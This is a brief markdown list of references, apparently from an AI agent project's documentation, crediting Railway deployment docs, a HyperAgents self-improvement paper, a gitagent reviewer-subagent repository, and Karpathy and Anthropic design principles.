- [Railway](https://docs.railway.com) — deployment integration
- [HyperAgents](https://arxiv.org/abs/2603.19461) — self-improvement architecture
- [gitagent](https://github.com/open-gitagent/gitagent) — SOD via reviewer subagent
- Karpathy LLM observations + Anthropic Harness Design — principles 1–11
